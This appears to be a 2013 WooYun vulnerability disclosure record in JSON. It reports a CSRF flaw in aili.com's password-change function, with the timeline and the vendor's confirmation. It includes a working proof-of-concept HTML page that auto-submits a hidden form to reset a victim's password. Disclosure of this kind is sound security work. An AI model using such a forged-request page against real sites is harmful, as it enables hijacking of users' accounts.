{"id": 64121, "wybug_id": "wooyun-2013-027335", "wybug_title": "爱丽网CSRF劫持用户账号", "wybug_corp": "aili.com", "wybug_author": "花开若相惜", "wybug_date": "2013-07-01 14:48", "wybug_open_date": "2013-08-15 14:48", "wybug_type": "CSRF", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": [], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-07-01：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-07-01：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-07-11：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-07-21：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-07-31：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-08-15：\t细节向公众公开  简要描述： CSRF 详细说明：  修改密码的地方没有做csrf的防御，无token值。\n\n不光这一个地方，全局都没有考虑到CSRF的问题。   漏洞证明：  测试代码<html><head><title>CSRF TEST</title></head><body onload=\"javascript:fireForms()\"><script language=\"JavaScript\">var pauses = new Array( \"1344\" );function pausecomp(millis){    var date = new Date();    var curDate = null;    do { curDate = new Date(); }    while(curDate-date < millis);}function fireForms(){    var count = 1;    var i=0;     for(i=0; i<count; i++)    {        document.forms[i].submit();         pausecomp(pauses[i]);    }} </script><H2>CSRF TEST</H2><form method=\"POST\" name=\"form0\" action=\"http://member.aili.com:80/index.php?m=member&c=member&a=editpass\"><input type=\"hidden\" name=\"infor2\" value=\"test123456\"/><input type=\"hidden\" name=\"dosubmit\" value=\"1\"/><input type=\"hidden\" name=\"uname\" value=\"test2013\"/></form></body></html>   修复方案：  加入随即的token值   版权声明：转载请注明来源 花开若相惜@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2013-07-01 16:50 厂商回复： 白帽子辛苦了 小猿猴们会尽快修复, 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-07-03 01:00 |    \t\t花开若相惜 \t\t\t( 实习白帽子  |\t\t\t        Rank:33 漏洞数:8        | 技术无止境.)\t\t \n  我是奔着礼物来的。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}